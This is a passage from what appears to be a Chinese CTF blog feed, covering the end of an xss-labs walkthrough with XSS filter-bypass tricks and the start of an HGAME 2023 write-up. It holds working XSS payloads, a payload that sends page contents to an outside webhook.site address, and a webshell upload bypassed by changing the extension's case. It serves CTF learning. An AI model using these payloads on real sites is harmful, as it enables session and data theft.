class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>cookie作为注入点，bp抓包修改cookie</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">Cookie:&quot;onfocus=javascript:alert() type=&quot;text&quot;&quot;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel14php"><a class="markdownIt-Anchor" href="#xss-lablevel14php"></a> xss-lab/level14.php</h4><p>Exif xss</p><p>Exif 可交换图像文件格式，是专门为数码相机的照片设定的，可记录数码照片的属性信息和拍摄数据。</p><p>有些网站可以读取exif 信息，当传入一张含有恶意信息的图片的时候，就可以触发payload</p><img src="/2023/01/25/XSS/1.png" class=""><p>例如网站<a href="https://exifdata.com/">EXIF Data Viewer</a></p><p>14关用的网站是<a href="http://ww1.exifviewer.org/">http://ww1.exifviewer.org/</a> ,没有梯子是访问不了的，可以换成<a href="https://exifdata.com/">EXIF Data Viewer</a>，</p><p>这样就可以exif xss</p><p>将上面的图片上传即可触发</p><h4 id="xss-lablevel15php"><a class="markdownIt-Anchor" href="#xss-lablevel15php"></a> xss-lab/level15.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注入点在参数src</p><p>ng-include 其作用相当于php的include函数。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">特别值得注意的几点如下：<br> <br><span class="hljs-number">1.</span>ng-<span class="hljs-meta"><span class="hljs-keyword">include</span>,如果单纯指定地址，必须要加引号</span><br><span class="hljs-meta"> </span><br><span class="hljs-meta">2.ng-<span class="hljs-keyword">include</span>,加载外部html，script标签中的内容不执行</span><br><span class="hljs-meta"> </span><br><span class="hljs-meta">3.ng-<span class="hljs-keyword">include</span>,加载外部html中含有style标签样式可以识别</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">src=&#x27;level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">2</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel16php"><a class="markdownIt-Anchor" href="#xss-lablevel16php"></a> xss-lab/level16.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str5</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img src<span class="hljs-operator">=</span><span class="hljs-number">2</span> onerror<span class="hljs-operator">=</span>alert()&gt; 基本不含以上过滤的关键字<br>url空格可以用%<span class="hljs-number">0</span>a代替<br><span class="hljs-attribute">keyword</span><span class="hljs-operator">=</span>&lt;img%<span class="hljs-number">0</span>asrc<span class="hljs-operator">=</span><span class="hljs-number">2</span>%<span class="hljs-number">0</span>aonerror<span class="hljs-operator">=</span>alert()&gt;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel17php"><a class="markdownIt-Anchor" href="#xss-lablevel17php"></a> xss-lab/level17.php</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">xsf01.swf?a</span>=<span class="hljs-string">b</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;embed&gt;</code>标签就是引入一个<code>swf文件</code>到浏览器端，并且它的src属性值没有添加引号，所以不用闭合，可能可以利用</p><p>不知为何swf文件并没有引入</p><p>没有引号闭合，按道理是在第二个参数前面加一个空格和src 分隔开</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=a&amp;arg02= <span class="hljs-attribute">onmouseover</span>=alert(1)<br></code></pre></td></tr></table></figure><p>应该对的，但是结果没有alert()</p><h4 id="xss-lablevel18php"><a class="markdownIt-Anchor" href="#xss-lablevel18php"></a> xss-lab/level18.php</h4><p>只是换了个插件，其他同17关</p><h4 id="xss-lablevel19php"><a class="markdownIt-Anchor" href="#xss-lablevel19php"></a> xss-lab/level19.php</h4><h4 id="xss-lablevel20php"><a class="markdownIt-Anchor" href="#xss-lablevel20php"></a> xss-lab/level20.php</h4><p>19,20有双引号闭合，而且用了htmlspecialchars(),对字符进行实体转义，还是flash插件的xss，太复杂不会</p><h3 id="一些xss技巧"><a class="markdownIt-Anchor" href="#一些xss技巧"></a> 一些XSS技巧</h3><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>若&lt;&gt;被转义，则寻找为被转义的注入点</p><p>都被转义，可以使用onfocus配合javascript 伪协议来执行javascript 代码<code>onfocus=javascript:alert()</code>或者<code>onmouseover='alert()'</code></p><p>on 被转义，可以大写绕过On,或借助&lt;a&gt;标签<code>&lt;a href=javascript:alert()&gt;hhh&lt;/a&gt;</code></p><p>以上被过滤，可以用<code>&lt;img src=2 onerror=alert()&gt;</code></p><p>href有属性自动Unicode解码,如果注入点再href中，可以进行unicode编码</p><p>要求含有某些字符，可以将字符放在alert里边</p><p>exif xss 一般就是将文件详细信息修改成xss语句上传</p><p>ng-include 可以配合scr onerror <code>'level1.php?name=&lt;img src=2 onerror=alert()&gt;'</code></p><h4 id="空格绕过"><a class="markdownIt-Anchor" href="#空格绕过"></a> 空格绕过</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=alert(123)&gt;<br>&lt;svg%<span class="hljs-attribute">0conload</span>=alert(123)&gt;<br></code></pre></td></tr></table></figure><h4 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> /绕过</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">window</span>.<span class="hljs-keyword">location</span>.href.substring(<span class="hljs-number">7</span>,<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><h4 id="httponly-绕过"><a class="markdownIt-Anchor" href="#httponly-绕过"></a> httpOnly 绕过</h4><p>具有httponly属性的cookie不能被JavaScript 修改，例如使用<code>Document.cookie</code>,只能在服务器上修改</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</a></p><p>httpOnly 使得cookie不能够通过document.cookie等直接获取</p><p>一般是通过让服务器自己输出cookie，然后再把cookie发出来</p><p>例子</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xquery">&lt;svg<span class="hljs-meta">%0conload</span>=fetch(<span class="hljs-keyword">window</span>.location.href<span class="hljs-built_in">.substring</span>(<span class="hljs-number">0</span>,<span class="hljs-number">7</span>)<span class="hljs-meta">%2b</span><span class="hljs-string">&quot;idek-hello.chal.idek.team:1337&quot;</span><span class="hljs-meta">%2bwindow</span>.location.href<span class="hljs-built_in">.substring</span>(<span class="hljs-number">6</span>,<span class="hljs-number">7</span>)<span class="hljs-meta">%2b</span><span class="hljs-string">&quot;info.php&quot;</span><span class="hljs-meta">%2bwindow</span>.location.href<span class="hljs-built_in">.substring</span>(<span class="hljs-number">6</span>,<span class="hljs-number">7</span>)<span class="hljs-meta">%2b</span><span class="hljs-string">&quot;index.php&quot;</span>).<span class="hljs-keyword">then</span>(<span class="hljs-keyword">function</span>(response)&#123;<br>    response.<span class="hljs-type">text</span>().<span class="hljs-keyword">then</span>(<span class="hljs-keyword">function</span>(txt)&#123;<br>        txt.split(<span class="hljs-string">&#x27;\n&#x27;</span>).forEach(<span class="hljs-keyword">function</span>(line)&#123;<br>            <span class="hljs-keyword">if</span>(line.indexOf(<span class="hljs-string">&quot;FLAG&quot;</span>)!=-<span class="hljs-number">1</span>)&#123;<br>fetch(<span class="hljs-string">&quot;https:&quot;</span><span class="hljs-meta">%2bwindow</span>.location.href<span class="hljs-built_in">.substring</span>(<span class="hljs-number">5</span>,<span class="hljs-number">7</span>)<span class="hljs-meta">%2b</span><span class="hljs-string">&quot;webhook.site&quot;</span><span class="hljs-meta">%2bwindow</span>.location.href<span class="hljs-built_in">.substring</span>(<span class="hljs-number">6</span>,<span class="hljs-number">7</span>)<span class="hljs-meta">%2b</span><span class="hljs-string">&quot;b7aa3086-6e7d-47a3-aba4-83a7ac8dc26f?resp=&quot;</span><span class="hljs-meta">%2bline</span>)<br>            &#125;<br>        &#125;)<br>    &#125;)<br>&#125;)&gt;<br></code></pre></td></tr></table></figure><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> <em>参考资料</em></h3><p><em><a href="https://ctf-wiki.org/web/xss/">https://ctf-wiki.org/web/xss/</a></em></p><p><em><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></em></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME</title>
    <link href="/2023/01/05/HGAME/"/>
    <url>/2023/01/05/HGAME/</url>
    
    <content type="html"><![CDATA[<h2 id="week-1"><a class="markdownIt-Anchor" href="#week-1"></a> Week 1</h2><h3 id="sign-in"><a class="markdownIt-Anchor" href="#sign-in"></a> Sign In</h3><p>签到题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>flag=<span class="hljs-string">&quot;aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ==&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br><span class="hljs-comment">#b&#x27;hgame&#123;Welcome_To_HGAME2023!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="classic-childhood-game"><a class="markdownIt-Anchor" href="#classic-childhood-game"></a> Classic Childhood Game</h3><p>打开题目是个游戏，先随便玩玩</p><p>这种题就是前端JS，玩腻了直接看源码</p><p>在文件<code>./Res/Events.js</code>拉到最下面有一个变量a是unicode编码</p><p><code>\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35</code></p><p>直接到Python解码</p><img src="/2023/01/05/HGAME/3.png" class=""><h3 id="become-a-member"><a class="markdownIt-Anchor" href="#become-a-member"></a> Become A Member</h3><p>考察HTTP请求头</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-number">1</span>.请先提供一下身份证明（<span class="hljs-title class_">Cute</span>-<span class="hljs-title class_">Bunny</span>）哦    <span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span><span class="hljs-symbol">:Cute-Bunny</span><br><span class="hljs-number">2</span>.每一个能够成为会员的顾客们都应该持有名为<span class="hljs-title class_">Vidar</span>的邀请码（code）    <span class="hljs-title class_">Cookie</span><span class="hljs-symbol">:code=Vidar</span><br><span class="hljs-number">3</span>.由于特殊原因，我们只接收来自于bunnybunnybunny.com的会员资格申请<span class="hljs-symbol">referer:</span>bunnybunnybunny.com<br><span class="hljs-number">4</span>.就差最后一个本地的请求，就能拿到会员账号啦X-forwarded-<span class="hljs-symbol">for:</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-number">5</span>.<span class="hljs-symbol">username:</span>luckytoday <span class="hljs-symbol">password:</span>happy123(请以json请求方式登陆)&#123;<span class="hljs-string">&quot;username&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;luckytoday&quot;</span></span>,<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;happy123&quot;</span></span>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/6.png" class=""><h3 id="guess-who-i-am"><a class="markdownIt-Anchor" href="#guess-who-i-am"></a> Guess Who I Am</h3><p>这个题是要写脚本回答100个问题</p><p>查看页面源码给了hint: <a href="https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js">https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js</a></p><p>访问得到答案库</p><p>把答案考到本地</p><p>接着写Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380&quot;</span><br>url1 = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380/api/getQuestion&quot;</span><br>url2 = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380/api/getScore&quot;</span><br>Cookie=<span class="hljs-string">&quot;session=MTY3MjkzNzc4MHxEdi1CQkFFQ180SUFBUkFCRUFBQVBQLUNBQUlHYzNSeWFXNW5EQWdBQm5OdmJIWmxaQU5wYm5RRUFnQUVCbk4wY21sdVp3d05BQXRqYUdGc2JHVnVaMlZKWkFOcGJuUUVBd0Rfb2c9PXyjkMJVTSpoY_gUdzTPAsOafTVVHnJtDE4aemtvw51VCw==&quot;</span><br><span class="hljs-comment"># resp = requests.get(url)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">110</span>):<br>    resp1 = requests.get(url1,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:Cookie&#125;)<br>    resp2 = requests.get(url2,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:Cookie&#125;)<br>    text1 = resp1.text<br>    text1 = text1[text1.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;00&#x27;</span> <span class="hljs-keyword">in</span> text1:<br>        text1=text1[text1.index(<span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">5</span>:] <span class="hljs-comment">#爬下来特殊字符都是unicode编码，去掉这些编码符，后面匹配就行</span><br>    text2 = resp2.text<br>    text2 = text2[text2.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># print(text1)</span><br>    <span class="hljs-comment"># print(text2)</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.js&#x27;</span>, mode=<span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        line0 = f.readline()<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            line1 = f.readline()<br>            <span class="hljs-keyword">if</span> line1:<br>                <span class="hljs-keyword">if</span> text1 <span class="hljs-keyword">in</span> line1:<br>                    answer = line0[line0.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">3</span>:-<span class="hljs-number">3</span>]<br>                    <span class="hljs-comment"># print(answer)</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    line0 = line1<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">break</span><br>    data=&#123;<br>        <span class="hljs-string">&quot;id&quot;</span>:answer<br>    &#125;<br>    <span class="hljs-comment"># print(data)</span><br>    r = requests.post(url=url+<span class="hljs-string">&#x27;/api/verifyAnswer&#x27;</span>,data=data,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>: Cookie&#125;)<br>    <span class="hljs-keyword">try</span>:<br>        Cookie=r.headers[<span class="hljs-string">&#x27;set-cookie&#x27;</span>]  <span class="hljs-comment">#有时访问后没有返回cookie会报错</span><br>    <span class="hljs-keyword">except</span> KeyError:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-comment"># print(Cookie)</span><br>    <span class="hljs-built_in">print</span>(r.text)<br>    resp2 = requests.get(url2, headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>: Cookie&#125;)<br>    text2 = resp2.text<br>    text2 = text2[text2.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(text2)<br></code></pre></td></tr></table></figure><p>回答100次后得到flag:<code>hgame&#123;Guess_who_i_am^Happy_Crawler&#125;</code></p><h3 id="show-me-your-beauty"><a class="markdownIt-Anchor" href="#show-me-your-beauty"></a> Show Me Your Beauty</h3><p>这是一道文件上传</p><p>查看页面源码，发现做了前端过滤，不过前端过滤相当于没有过滤</p><p>传个码上去，先用后缀.jpg，再抓包改，发现后端也过滤了，这里可以大写绕过</p><img src="/2023/01/05/HGAME/4.png" class=""><p>蚁剑连接拿flag</p><h3 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h3><p>拿到附件，源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n=p*q<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c=<span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n=<span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span><br><span class="hljs-string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>常规RSA题</p><p><a href="http://www.factordb.com/">在线网站</a>大整数分解n得到p,q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>c=<span class="hljs-number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span><br>n=<span class="hljs-number">135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span><br>p=<span class="hljs-number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span><br>q=<span class="hljs-number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span><br>e = <span class="hljs-number">65537</span><br><br>d = libnum.invmod(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure><h3 id="be-stream"><a class="markdownIt-Anchor" href="#be-stream"></a> Be Stream</h3><p>题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(flag) == <span class="hljs-built_in">bytes</span><br><br>key = [<span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;Be water&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>), <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;my friend&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stream</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> key[<span class="hljs-number">0</span>]<br>    <span 